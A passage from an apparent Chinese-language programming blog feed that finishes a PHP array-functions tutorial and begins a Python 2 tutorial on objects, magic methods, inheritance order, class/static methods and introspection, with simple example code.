id="3-使用回调函数处理数组"><a href="#3-使用回调函数处理数组" class="headerlink" title="3.使用回调函数处理数组"></a><strong>3.使用回调函数处理数组</strong></h4><p>1.array_filter(数组，自定义函数)用回调函数过滤数组中的单元，函数返回真数据留下否则不留）</p><p>2.array_walk(数组，函数，其他)对数组中的每个元素应用回调函数，键和值都会传到函数中，值作为第一个参数，键作为第二个参数，因此这个函数需要接受两个值，还存在第三个参数，可以也当做变量传入中间的函数，作为参数</p><p>3.array_map(函数，数组，[数组])将回调函数作用到对应的数组元素值上，返回值是一个数组。第三个数组的元素个数一定要和第二个数组相同，函数可以接受两个参数，分别是两个数组对应的元素，进行操作，一定要用return 返回，</p><p><strong>注意一下：</strong><br>一.array_map() 和array_walk()还是有一定区别：</p><p>1.array_walk()能把数组的键和值全部传进去，但是array_map()只能传进去。<br>2.array_walk()可以直接对数组进行操作不需要回值，但是array_map()就是根据传入的值得情况去返回一个值，代替原值，形成一个新的数组</p><p>二.array_filter()和array_map()也有区别：</p><p>前者返回的只是true或者false，True的保留,false的移除形成一个新的数组，但是不能改变数组元素的值</p><h3 id="七、数组的排序函数"><a href="#七、数组的排序函数" class="headerlink" title="七、数组的排序函数"></a><strong>七、数组的排序函数</strong></h3><h4 id="数组排序函数"><a href="#数组排序函数" class="headerlink" title="数组排序函数"></a><strong>数组排序函数</strong></h4><p>sort()<br>rsort()<br>usort()<br>asort()<br>arsort()<br>uasort()<br>ksort()<br>krsort()uksort()<br>nasort()<br>natcasesort()<br>array_multisort()</p><h4 id="1-简单的数组排序-、"><a href="#1-简单的数组排序-、" class="headerlink" title="1.简单的数组排序  、"></a><strong>1.简单的数组排序</strong>  、</h4><pre><code class="hljs">sort() rsort()sort(array &amp;array[, int sort_flag])</code></pre><p>都是直接改变原数组的</p><h4 id="2-根据键值对数组进行排序"><a href="#2-根据键值对数组进行排序" class="headerlink" title="2.根据键值对数组进行排序"></a><strong>2.根据键值对数组进行排序</strong></h4><pre><code class="hljs">ksort() krsort(）</code></pre><h4 id="3-根据值进行排序"><a href="#3-根据值进行排序" class="headerlink" title="3.根据值进行排序"></a><strong>3.根据值进行排序</strong></h4><pre><code class="hljs">asort()  arsort()</code></pre><blockquote><p><strong>注意：</strong></p><p>sort()和rsort()也是根据值进行排序的但是他会忽略键值，排序完就成了顺序排列的数字，但是这个不会，键值对的关系将会保留。</p></blockquote><h4 id="4-根据自然数排序法对数组排序"><a href="#4-根据自然数排序法对数组排序" class="headerlink" title="4.根据自然数排序法对数组排序"></a><strong>4.根据自然数排序法对数组排序</strong></h4><p>natsort()  natcasesort()<br>前一个区分大小写，后一个不区分</p><pre><code class="hljs">$arr=array(&quot;file1.txt&quot;,&quot;file2.txt&quot;,&quot;file11.txt&quot;,&quot;file6.txt&quot;);</code></pre><p>类似于这样的数组，如果我们直接根据值进行排序，一位一位的比较但是我们得到的会是 1 11 2 6 这样的结果，我们用这两个也会是一位一位的比较，但是数字的排序是正确的</p><h4 id="5-根据用户自定义的规则对数组进行排序"><a href="#5-根据用户自定义的规则对数组进行排序" class="headerlink" title="5.根据用户自定义的规则对数组进行排序"></a><strong>5.根据用户自定义的规则对数组进行排序</strong></h4><p>usort()  uasort() uksort()</p><p>参数采用   数组，回调函数  的模式</p><pre><code class="hljs">function sortbylen($one,$two)&#123;if(strlen($one)==strlen($two))return 0;else&#123;return (strlen($one)&gt;strlen($two))?1:-1;//正一代表往后移，负一代表往前移。&#125;&#125;</code></pre><h4 id="6-多维数组进行排序"><a href="#6-多维数组进行排序" class="headerlink" title="6.多维数组进行排序"></a><strong>6.多维数组进行排序</strong></h4><pre><code class="hljs">array_multisort()</code></pre><h3 id="八、拆分-合并-分解-结合-的数组函数"><a href="#八、拆分-合并-分解-结合-的数组函数" class="headerlink" title="八、拆分 合并 分解 结合 的数组函数"></a><strong>八、拆分 合并 分解 结合 的数组函数</strong></h3><h4 id="1-array-slice-数组，起始，结束"><a href="#1-array-slice-数组，起始，结束" class="headerlink" title="1.array_slice(数组，起始，结束)"></a><strong>1.array_slice(数组，起始，结束)</strong></h4><p><strong>注意:</strong></p><p>数组下标从零开始<br>他并不是在源数组上进行操作，而是返回一个新的数组，<br>还有第四个参数 true或者false true 的话键值不会改变，保留原来（这对关联数组没有影响，始终是保留键值的）</p><h4 id="2-array-splice"><a href="#2-array-splice" class="headerlink" title="2.array_splice()"></a><strong>2.array_splice()</strong></h4><p>直接改变原数组，选择数组中的将其删除，并将删除的数组返回，如果有第四个参数（一个数组）就把他们用这些值一一替换</p><h4 id="3-array-combine-键名数组，键值数组"><a href="#3-array-combine-键名数组，键值数组" class="headerlink" title="3.array_combine(键名数组，键值数组)"></a><strong>3.array_combine(键名数组，键值数组)</strong></h4><p>合并两个数组创建一个新的数组，其中一个数组作为键名 一个作为键值如果一个数组为空，或者两个个数不相同就会返回假</p><h4 id="4-array-merge"><a href="#4-array-merge" class="headerlink" title="4.array_merge()"></a><strong>4.array_merge()</strong></h4><p>把一个或者多个数组合并成一个数组，如果键名有重复，该键的键值为最后一个对应的值，后面的覆盖前面的。如果数组是数字索引那么数组会以连续的重复索引合并在一起</p><h4 id="5-array-intersect"><a href="#5-array-intersect" class="headerlink" title="5.array_intersect()"></a><strong>5.array_intersect()</strong></h4><p>计算数组的交集</p><h4 id="6-array-diff-数组1-数组2"><a href="#6-array-diff-数组1-数组2" class="headerlink" title="6.array_diff(数组1,数组2)"></a><strong>6.array_diff(数组1,数组2)</strong></h4><p>返回两个数组的差集，返回的是数组1有但是数组2没有的部分。</p><h3 id="九、数组与数据结构相关的函数"><a href="#九、数组与数据结构相关的函数" class="headerlink" title="九、数组与数据结构相关的函数"></a><strong>九、数组与数据结构相关的函数</strong></h3><h4 id="1-使用数组来实现堆栈的功能"><a href="#1-使用数组来实现堆栈的功能" class="headerlink" title="1.使用数组来实现堆栈的功能"></a><strong>1.使用数组来实现堆栈的功能</strong></h4><p>array_push(数组，值1，值2…)入栈———–》我们一般使用 $a[]&#x3D;”” 直接赋值的方法来入栈，这样效率更高，但是连续入栈两个我个人觉得函数更加方便<br>array_pop(数组)出栈 ————》每次出栈一个，并返回</p><h4 id="2-使用数组实现队的功能"><a href="#2-使用数组实现队的功能" class="headerlink" title="2.使用数组实现队的功能"></a><strong>2.使用数组实现队的功能</strong></h4><p>array_unshift(数组，值1，值2….)</p><p><strong>注意：</strong><br>php的队尾是数组的最左边,值1比值2后进队。</p><p>array_shift(数组)  </p><p>删除队头元素，记得用一个值接受</p><p><strong>特别注意 ：</strong></p><p>unset()  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;既可以删除变量，也可以删除数组中的元素，还可以删除对象中的成员</p><h4 id="3，其他和数据操作有关的函数"><a href="#3，其他和数据操作有关的函数" class="headerlink" title="3，其他和数据操作有关的函数"></a><strong>3，其他和数据操作有关的函数</strong></h4><p><strong>array_rand(数组，个数)</strong>  </p><p>随机从数组中取出一个或者多个元素的键值并且返回取一个就返回一个，取得多就返回数组</p><p><strong>shuffle()</strong></p><p>将数组中的元素随机打乱，成功时返回真，失败时返回假（对原数组直接操作）</p><p><strong>array_sum()</strong> </p><p>将数组元素求和</p><p><strong>range(元素的最小值，最大值，步长)</strong></p><p>创建一个包含指定范围内元素的数组，有三个参数，前两个可以是字母</p><p><strong>array_map(函数名，数组)</strong> </p><p>将数组的每一个值传入一个函数，返回的是函数处理之后的新数组。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a><strong>结语</strong></h2><p>这些就是PHP 的最基本的语法内容，其他面向对象的 内容请关注我的另一篇文章**《PHP 编程进阶（重点是面向对象和MVC）》**</p>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程 PHP 基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 编程进阶（重点在于面向对象和魔法方法）</title>
    <link href="/2018/10/04/Python%20%E7%BC%96%E7%A8%8B%E8%BF%9B%E9%98%B6%EF%BC%88%E9%87%8D%E7%82%B9%E5%9C%A8%E4%BA%8E%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%92%8C%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%EF%BC%89/"/>
    <url>/2018/10/04/Python%20%E7%BC%96%E7%A8%8B%E8%BF%9B%E9%98%B6%EF%BC%88%E9%87%8D%E7%82%B9%E5%9C%A8%E4%BA%8E%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%92%8C%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="一、Python-一切皆对象"><a href="#一、Python-一切皆对象" class="headerlink" title="一、Python 一切皆对象"></a><strong>一、Python 一切皆对象</strong></h2><p>Python 的一切皆对象是非常彻底的，不管是函数还是类，都是对象，对象就有一些独特的特性</p><p>1.赋值给一个变量<br>2.可以添加到集合对象中<br>3.都能作为函数的参数进行传递<br>4.都能当做函数的返回值</p><span id="more"></span><h3 id="1-赋值给一个变量"><a href="#1-赋值给一个变量" class="headerlink" title="1.赋值给一个变量"></a><strong>1.赋值给一个变量</strong></h3><p><strong>(1)函数赋值给一个变量</strong></p><p><strong>示例代码:</strong></p><pre><code class="hljs">def add(name = &quot;K0rz3n&quot;):    print nameobject_test = addobject_test()</code></pre><p><strong>(2)类赋值给一个变量</strong></p><pre><code class="hljs">class Person():    def __init__(self):        print &quot;K0rz3n&quot;class_test = Personclass_test()</code></pre><h3 id="2-添加到集合对象中"><a href="#2-添加到集合对象中" class="headerlink" title="2.添加到集合对象中"></a><strong>2.添加到集合对象中</strong></h3><pre><code class="hljs">def add(name = &quot;K0rz3n&quot;):    print nameclass Person():    def __init__(self):        print &quot;K0rz3n&quot;obj_list = []obj_list.append(add)obj_list.append(Person)for item in obj_list:    print item()</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">K0rz3nNoneK0rz3n&lt;__main__.Person instance at 0x0000000003277E08&gt;</code></pre><h3 id="3-可以作为函数的返回值"><a href="#3-可以作为函数的返回值" class="headerlink" title="3.可以作为函数的返回值"></a><strong>3.可以作为函数的返回值</strong></h3><p>函数作为返回值其实是 python 装饰器的精髓</p><p><strong>示例代码：</strong></p><pre><code class="hljs">def add(name = &quot;K0rz3n&quot;):    print nameclass Person():    def __init__(self):        print &quot;K0rz3n&quot;def decorator():    print &quot;dec success&quot;    return addtest = decorator()test()</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">dec successK0rz3n</code></pre><h2 id="二、type-和-object-的关系"><a href="#二、type-和-object-的关系" class="headerlink" title="二、type 和 object 的关系"></a><strong>二、type 和 object 的关系</strong></h2><h3 id="1-type"><a href="#1-type" class="headerlink" title="1.type"></a><strong>1.type</strong></h3><p><strong>type 这个类实例化了一切，包括 object 和 他自己</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">&gt;&gt;&gt; type(1)&lt;class &#39;int&#39;&gt;&gt;&gt;&gt; type(int)&lt;class &#39;type&#39;&gt;&gt;&gt;&gt; type(type)&lt;class &#39;type&#39;&gt;&gt;&gt;&gt; type(object)&lt;class &#39;type&#39;&gt;</code></pre><p>可以看到，1 是由 int 这个类生成的对象，int 这个类是由type 这个类生成的对象</p><p><strong>结论：</strong></p><pre><code class="hljs">type-&gt;class-&gt;obj</code></pre><h3 id="2-object"><a href="#2-object" class="headerlink" title="2.object"></a><strong>2.object</strong></h3><p>object 是最顶层的基类，<strong>所有的类都继承了Object，包括type</strong> </p><p><strong>示例代码:</strong></p><pre><code class="hljs">&gt;&gt;&gt; class Student():...     pass...&gt;&gt;&gt; Student.__bases__(&lt;class &#39;object&#39;&gt;,)&gt;&gt;&gt; type.__bases__(&lt;class &#39;object&#39;&gt;,)&gt;&gt;&gt; object.__bases__()</code></pre><p>但是 object 是由 type 实例化的</p><p><strong>示例代码：</strong></p><pre><code class="hljs">&gt;&gt;&gt; type(object)&lt;class &#39;type&#39;&gt;</code></pre><p><strong>总结：</strong></p><p>type 实例化了一切，包括 object 和他自己,object 是所有类的基类（最顶层，包括type）。于是乎 Type 和 object 就形成了一个回路，<strong>这其实也就是python 中类也是对象的原因（不仅继承了object 还是type 这个类的实例）</strong></p><h2 id="三、Python-中的内置类型"><a href="#三、Python-中的内置类型" class="headerlink" title="三、Python 中的内置类型"></a><strong>三、Python 中的内置类型</strong></h2><h3 id="1-对象的三个特征"><a href="#1-对象的三个特征" class="headerlink" title="1.对象的三个特征"></a><strong>1.对象的三个特征</strong></h3><h4 id="（1）身份"><a href="#（1）身份" class="headerlink" title="（1）身份"></a><strong>（1）身份</strong></h4><p>我们把身份理解成对象在内存中的地址</p><p>我们可以通过id()这个函数查看一个对象在内存中的地址</p><p><strong>示例代码:</strong></p><pre><code class="hljs">&gt;&gt;&gt; a= 1&gt;&gt;&gt; id(a)1465347104&gt;&gt;&gt; a = []&gt;&gt;&gt; id(a)2406326173512</code></pre><h4 id="（2）类型"><a href="#（2）类型" class="headerlink" title="（2）类型"></a><strong>（2）类型</strong></h4><p>比如有：</p><p><strong>None （全局唯一）</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">&gt;&gt;&gt; a =None&gt;&gt;&gt; b = None&gt;&gt;&gt; id(a)1464902800&gt;&gt;&gt; id(b)1464902800</code></pre><p>可以看到两个变量都是指向了一个地址，说明其是全局唯一的</p><p><strong>数值</strong></p><p>Int、float、bool、complex…</p><p><strong>迭代类型</strong></p><p>可以遍历的</p><p><strong>序列类型</strong></p><p>list 、tuple 、str 、array 、range 、bytes… </p><p><strong>映射（dict）</strong></p><p>相当于字典，有 Key 和 value </p><p><strong>集合</strong></p><p>set 和 forzenset</p><p><strong>上下文管理器</strong></p><p>with 语句</p><p><strong>其他</strong></p><p>模块类型、class和实例、函数类型、方法类型、代码类型 、object 对象 、type 类型、ellipsis 类型</p><p>Python 有些类型是隐式的，<strong>主要是通过对象内置的魔法方法来判断对象是什么类型</strong>，这其实就是Python魔法方法的精髓，这在我们后面会详细的讲到</p><h4 id="（3）值"><a href="#（3）值" class="headerlink" title="（3）值"></a><strong>（3）值</strong></h4><p>这个我就不再细说了，相信大家都懂</p><h2 id="四、Python-中的魔法函数"><a href="#四、Python-中的魔法函数" class="headerlink" title="四、Python 中的魔法函数"></a><strong>四、Python 中的魔法函数</strong></h2><h3 id="1-什么是魔法函数"><a href="#1-什么是魔法函数" class="headerlink" title="1.什么是魔法函数"></a><strong>1.什么是魔法函数</strong></h3><p>1.Python中为我们提供的以双下划线开头和结尾的函数<br>2.魔法函数属于全局，在我们自定义的任意一个类中我们能添加任意一个魔法函数，来让这个类有着不同的性质（来增强这个类的特性，<strong>简单的说就相当于给这个类安装了一个插件</strong>）</p><p>在我们没有定义魔法函数之前，我们想遍历这个类中的员工，我们需要像这样写</p><p><strong>示例代码：</strong></p><pre><code class="hljs">class Company(object):    def __init__(self,employ_list):        self.employ = employ_listcompany = Company([&quot;Tom&quot;,&quot;Alice&quot;,&quot;Bob&quot;])employ = company.employfor item in employ:    print item</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">TomAliceBob</code></pre><p>但是我们在定义了一个魔法方法以后事情就变得非常的简单</p><p><strong>示例代码：</strong></p><pre><code class="hljs">class Company(object):    def __init__(self,employ_list):        self.employ = employ_list    def __getitem__(self, item):        return self.employ[item]company = Company([&quot;Tom&quot;,&quot;Alice&quot;,&quot;Bob&quot;])for item in company:    print item</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">TomAliceBob</code></pre><p><strong>解释：</strong></p><p>实际上我们定义了 <code>__getitem__</code> 这个魔法方法以后，这个类实例化出来的对象就是一个可迭代的对象</p><h3 id="2-str-和-repr"><a href="#2-str-和-repr" class="headerlink" title="2.__str__ 和 __repr__"></a><strong>2.<code>__str__</code> 和 <code>__repr__</code></strong></h3><h4 id="（1）-str"><a href="#（1）-str" class="headerlink" title="（1） __str__"></a><strong>（1） <code>__str__</code></strong></h4><p>Python 在使用 print 的时候会隐式的调用 str() 这个函数，而这个函数会隐式的调用  <code>__str__</code> 这个魔法方法,比如我们想改变一个对象的默认输出格式，我们就需要在实例化这个对象的类中重写 <code>__str__</code>方法</p><p><strong>示例代码：</strong></p><pre><code class="hljs">class Company(object):    def __init__(self,employ_list):        self.employ = employ_list        def __str__(self):        return &#39;,&#39;.join(self.employ)    company = Company([&quot;Tom&quot;,&quot;Alice&quot;,&quot;Bob&quot;])print company</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">Tom,Alice,Bob</code></pre><p>&#96;</p><h4 id="2-repr"><a href="#2-repr" class="headerlink" title="(2)__repr__"></a><strong>(2)<code>__repr__</code></strong></h4><p><code>__repr__</code> 是开发者模式下（交互式Python解释器中在直接写某个对象的时候会调用的函数），我们平时直接把对象写在交互式解析器中的时候会输出一些尖括号包裹的类或者对象就是隐式调用这个函数的结果，如果我们重写了这个魔法方法就能改变输出，这个和 上面的例子是一样的，我就不再重新写代码</p><h2 id="五、Python-深入类和对象"><a href="#五、Python-深入类和对象" class="headerlink" title="五、Python 深入类和对象"></a><strong>五、Python 深入类和对象</strong></h2><h3 id="1-鸭子类型和多态"><a href="#1-鸭子类型和多态" class="headerlink" title="1.鸭子类型和多态"></a><strong>1.鸭子类型和多态</strong></h3><p>一个对象如果他 走起来 叫起来 看起来 都像一个鸭子那我们就把他看成是一个鸭子，其实意思就是说我们关注的是这个对象内部实现了什么方法，实现的方法决定了我们将其看成是什么</p><p>1.比如extend(),它里面并没有要求传入某一个具体的类型，而是要求传入一个可迭代对象，所以很多的类型都是可以的</p><p>2.再比如，我们实现多态的时候并不像JAVA一样要求全部继承同一个类，python 只要内部实现同一个方法就可以了，到时候直接赋值调用就ok</p><p><strong>示例代码:</strong></p><pre><code class="hljs">class Cat(object):    def say(self):        print &quot;i am a cat\n&quot;class Dog(object):    def say(self):        print &quot;i am a dog\n&quot;animal = [Cat,Dog]for i in animal:    i().say()</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">i am a cati am a dog</code></pre><h3 id="2-Python-中的抽象基类"><a href="#2-Python-中的抽象基类" class="headerlink" title="2.Python 中的抽象基类"></a><strong>2.Python 中的抽象基类</strong></h3><h4 id="概念："><a href="#概念：" class="headerlink" title="概念："></a><strong>概念：</strong></h4><p>可以把 Python 的抽象基类看成是 java 中的接口，java 不能实现多继承单数能实现多个接口，接口在 java 中是不能实例化的，同样抽象基类在 Python 中也是不能实例化的（我们可以继承抽象基类，然后去实例化抽象基类的所有方法）</p><p>但是我们不是说过，python 是一种动态语言，<strong>动态语言是没有变量的类型的</strong>，Python中变量只是一个符号而已，他可以指向任何类型的对象。</p><p><strong>那么我们为什么还需要有抽象基类这个概念呢？</strong></p><p>1.因为我们在有些时候想判断某一个对象的类型，而不是通过一个一个的魔法函数的检验去查看对象的属性如何，这样的体验非常不好，我们提供抽象基类实际上就是提供一种类型（属性）的打包</p><p>2.我们在某些时候需要强制某些子类必须实现某些方法</p><p><strong>示例代码：</strong></p><pre><code class="hljs">class CacheBase():    def get(self,key):        raise NotImplemented    def set(self,key,value):        raise NotImplementedclass cache(CacheBase):   passmy_cache = cache()my_cache.get(&quot;key&quot;)</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">TypeError: exceptions must be old-style classes or derived from BaseException, not NotImplementedType</code></pre><p>当然我们如果想在实例化的时候就抛出异常的话就需要用到abc 模块以及装饰器的操作，这里不再多介绍</p><h3 id="3-isinstance-和-type-的区别"><a href="#3-isinstance-和-type-的区别" class="headerlink" title="3.isinstance 和 type 的区别"></a><strong>3.isinstance 和 type 的区别</strong></h3><p>这两个函数都是查看对象的归属的，但是 isinstacne() 会根据继承关系不断的向上递推，直到最顶层为止，但是 Type() 只能向上递推一个</p><p><strong>另外 &#x3D;&#x3D; 和 is 不要乱用</strong></p><p>&#x3D;&#x3D; 代表的是返回值是不是相等<br>is 查看的是 id() 的结果是不是相等</p><h3 id="4-类变量和对象变量"><a href="#4-类变量和对象变量" class="headerlink" title="4.类变量和对象变量"></a><strong>4.类变量和对象变量</strong></h3><p><strong>示例代码：</strong></p><pre><code class="hljs">class A:    aa = 1    def __init__(self,x,y):        self.x = x        self.y = ya = A(2,3)print a.x,a.y,a.aaprint A.aa</code></pre><p> <strong>结果：</strong></p><pre><code class="hljs">2 3 11</code></pre><p>这里 aa 就是类变量，那么为什么我们能打印出来呢？因为我们在寻找实例的属性的时候如果找不到就会自动的向上搜索</p><p><strong>还有一个比较神奇的地方</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">class A:    aa = 1    def __init__(self,x,y):        self.x = x        self.y = ya = A(2,3)A.aa = 10a.aa = 100print A.aaprint a.aa</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">10100</code></pre><p>可以看到我们在实例中修改了 aa 的值，但是我们在类中访问却依然没改变，这是为什么呢？</p><blockquote><p><strong>解释：</strong></p><p>我们使用 a.aa<br>访问或者赋值的时候实际上会在我们的实例中新建一个属性，我们访问或者修改的都是这个新的属性，这个属性初始值和类的一样，但是他们有着不用的地址空间，因此修改后互不影响</p></blockquote><h3 id="4-类和实例的属性查找顺序-mro"><a href="#4-类和实例的属性查找顺序-mro" class="headerlink" title="4.类和实例的属性查找顺序__mro__"></a><strong>4.类和实例的属性查找顺序<code>__mro__</code></strong></h3><p>在历史上 python 设置了很多的查找算法，比如 DFS BFS 等，但是依然不能用单纯的一个方法解决所有的问题，于是后来出现了 C3 算法，这个算法比较复杂，能针对不同的模式调整查找顺序</p><h4 id="（1）菱形继承方式"><a href="#（1）菱形继承方式" class="headerlink" title="（1）菱形继承方式"></a><strong>（1）菱形继承方式</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">class D(object):    passclass C(D):    passclass B(D):    passclass A(B, C):    passprint A.__mro__</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">(&lt;class &#39;__main__.A&#39;&gt;, &lt;class &#39;__main__.B&#39;&gt;, &lt;class &#39;__main__.C&#39;&gt;, &lt;class &#39;__main__.D&#39;&gt;, &lt;type &#39;object&#39;&gt;)</code></pre><p><strong>解释：</strong></p><p>可见这种继承方式使用的是 BFS </p><h4 id="（2）锥形继承方式"><a href="#（2）锥形继承方式" class="headerlink" title="（2）锥形继承方式"></a><strong>（2）锥形继承方式</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">class E(object):    passclass D(object):    passclass C(E):    passclass B(D):    passclass A(B, C):    passprint A.__mro__</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">(&lt;class &#39;__main__.A&#39;&gt;, &lt;class &#39;__main__.B&#39;&gt;, &lt;class &#39;__main__.D&#39;&gt;, &lt;class &#39;__main__.C&#39;&gt;, &lt;class &#39;__main__.E&#39;&gt;, &lt;type &#39;object&#39;&gt;)</code></pre><p><strong>解释：</strong></p><p>可见这种结构的继承方式使用的是 DFS </p><h3 id="5-类方法、静态方法和实例方法"><a href="#5-类方法、静态方法和实例方法" class="headerlink" title="5.类方法、静态方法和实例方法"></a><strong>5.类方法、静态方法和实例方法</strong></h3><h4 id="（1）实例方法："><a href="#（1）实例方法：" class="headerlink" title="（1）实例方法："></a><strong>（1）实例方法：</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">class Date():    def __init__(self,year,month,day):        self.year = year        self.month = month        self.day = day    def __str__(self):        return &quot;&#123;year&#125;/&#123;month&#125;/&#123;day&#125;&quot;.format(year = self.year,month = self.month,day = self.day)new_day = Date(2018,10,2)print new_day</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">2018/10/2</code></pre><p>但是如果我们有这样的需求，我们输入 2018-10-2 也能直接解析怎么办，这个时候我们就需要使用静态方法</p><h4 id="（2）静态方法："><a href="#（2）静态方法：" class="headerlink" title="（2）静态方法："></a><strong>（2）静态方法：</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">class Date():    def __init__(self,year,month,day):        self.year = year        self.month = month        self.day = day    @staticmethod    def parse_fro_string(data_str):        year,month,day = tuple(data_str.split(&#39;-&#39;))        return Date(int(year),int(month),int(day))    def __str__(self):        return &quot;&#123;year&#125;/&#123;month&#125;/&#123;day&#125;&quot;.format(year = self.year,month = self.month,day = self.day)new_day = Date.parse_fro_string(&quot;2018-10-2&quot;)print new_day</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">2018/10/2</code></pre><p>但是，这个还有一个问题，就是静态方法是硬编码的，如果我们的类的名字改了，静态方法也要改，这很不好，于是我们就引出了类方法</p><h4 id="（3）类方法："><a href="#（3）类方法：" class="headerlink" title="（3）类方法："></a><strong>（3）类方法：</strong></h4><pre><code class="hljs">class Date():    def __init__(self,year,month,day):        self.year = year        self.month = month        self.day = day    @staticmethod    def parse_fro_string(data_str):        year,month,day = tuple(data_str.split(&#39;-&#39;))        return Date(int(year),int(month),int(day))    @classmethod    def fro_string(cls,data_str):        year, month, day = tuple(data_str.split(&#39;-&#39;))        return cls(int(year), int(month), int(day))    def __str__(self):        return &quot;&#123;year&#125;/&#123;month&#125;/&#123;day&#125;&quot;.format(year = self.year,month = self.month,day = self.day)new_day = Date.fro_string(&quot;2018-10-2&quot;)print new_day</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">2018/10/2</code></pre><h3 id="6-数据封装和私有属性"><a href="#6-数据封装和私有属性" class="headerlink" title="6.数据封装和私有属性"></a><strong>6.数据封装和私有属性</strong></h3><p>python 不像 java 有 Private 或者 protetced 这种，那么 Python 是怎么实现私有属性的</p><p><strong>示例代码：</strong></p><pre><code class="hljs"> class Date():    def __init__(self,year,month,day):        self.year = year        self.month = month        self.day = day    @staticmethod    def parse_fro_string(data_str):        year,month,day = tuple(data_str.split(&#39;-&#39;))        return Date(int(year),int(month),int(day))    @classmethod    def fro_string(cls,data_str):        year, month, day = tuple(data_str.split(&#39;-&#39;))        return cls(int(year), int(month), int(day))    def __str__(self):        return &quot;&#123;year&#125;/&#123;month&#125;/&#123;day&#125;&quot;.format(year = self.year,month = self.month,day = self.day)class User:    def __init__(self,birthday):        self.birthday = birthday    def get_age(self):        return 2018-self.birthday.yearif __name__ == &#39;__main__&#39;:    user = User(Date(1990,2,1))    print user.get_age()    print user.birthday</code></pre><p><strong>结果:</strong></p><pre><code class="hljs"> 28 1990/2/1</code></pre><p>在这种情况下，我们可以直接访问到用户的生日，如果我们不想直接访问到怎么办？我们可以在属性前面加上双下划线来解决</p><p><strong>示例代码：</strong></p><pre><code class="hljs">class User:    def __init__(self,birthday):        self.__birthday = birthday    def get_age(self):        return 2018-self.__birthday.yearif __name__ == &#39;__main__&#39;:    user = User(Date(1990,2,1))    print user.get_age()    print user.__birthday</code></pre><p>可以测试一下 get_age 这个函数还是可以使用的但是 直接访问会出错</p><p>但是实际上这个是可以绕过的,python 只是将其做了一个变形而已,变成了  _User__birthday</p><p><strong>示例代码：</strong></p><pre><code class="hljs">class User:    def __init__(self,birthday):        self.__birthday = birthday    def get_age(self):        return 2018-self.__birthday.yearif __name__ == &#39;__main__&#39;:    user = User(Date(1990,2,1))    print user.get_age()    print user._User__birthday</code></pre><p>这样就又能正常访问了</p><h3 id="7-Python-对象的自省机制"><a href="#7-Python-对象的自省机制" class="headerlink" title="7.Python 对象的自省机制"></a><strong>7.Python 对象的自省机制</strong></h3><h4 id="1-什么叫做自省？"><a href="#1-什么叫做自省？" class="headerlink" title="1. 什么叫做自省？"></a><strong>1. 什么叫做自省？</strong></h4><p>自省就是通过一定的机制来查看对象的内部结构（看看自己是什么东西…自我认识一下）</p><p><strong>示例代码：</strong></p><pre><code class="hljs">class Person():    name = &quot;user&quot;class Student(Person):    def __init__(self,school_name):        self.school_name = school_nameif __name__ == &#39;__main__&#39;:    user = Student(&quot;K0rz3n&quot;)    print user.__dict__    print Person.__dict__</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">&#123;&#39;school_name&#39;: &#39;K0rz3n&#39;&#125;&#123;&#39;__module__&#39;: &#39;__main__&#39;, &#39;name&#39;: &#39;user&#39;, &#39;__doc__&#39;: None&#125;</code></pre><p>除了使用 <code>__dict__</code> 以外我们还能使用 dir() 这个函数，这个函数功能更加强大，能列出对象的所有属性</p><p><strong>示例代码：</strong></p><pre><code class="hljs">class Person():    name = &quot;user&quot;class Student(Person):    def __init__(self,school_name):        self.school_name = school_nameif __name__ == &#39;__main__&#39;:    user = Student(&quot;K0rz3n&quot;)    print user.__dict__    print Person.__dict__    print dir(user)    print dir(Person)</code></pre><p><strong>结果:</strong></p><pre><code class="hljs">&#123;&#39;school_name&#39;: &#39;K0rz3n&#39;&#125;&#123;&#39;__module__&#39;: &#39;__main__&#39;, &#39;name&#39;: &#39;user&#39;, &#39;__doc__&#39;: None&#125;[&#39;__doc__&#39;, &#39;__init__&#39;, &#39;__module__&#39;, &#39;name&#39;, &#39;school_name&#39;][&#39;__doc__&#39;, &#39;__module__&#39;, &#39;name&#39;]</code></pre><h3 id="8-super-真的是调用父类吗"><a href="#8-super-真的是调用父类吗" class="headerlink" title="8.super 真的是调用父类吗"></a><strong>8.super 真的是调用父类吗</strong></h3><p>我们可以在 B中用super()函数调用了父类 A 中的构造方法</p><p><strong>示例代码：</strong></p><pre><code class="hljs">class A(object):    def __init__(self):        print &quot;a&quot;class B(A):    def __init__(self):        super(B,self).__init__()        print &quot;b&quot;if __name__ ==  &#39;__main__&#39;:    b = B()</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">ab</code></pre><h4 id="1-为什么要这样用"><a href="#1-为什么要这样用" class="headerlink" title="1.为什么要这样用"></a><strong>1.为什么要这样用</strong></h4><p>有时候我们可以通过这种方式来重用父类的方法，而不是重写</p><h4 id="2-真的是调用父类吗？"><a href="#2-真的是调用父类吗？" class="headerlink" 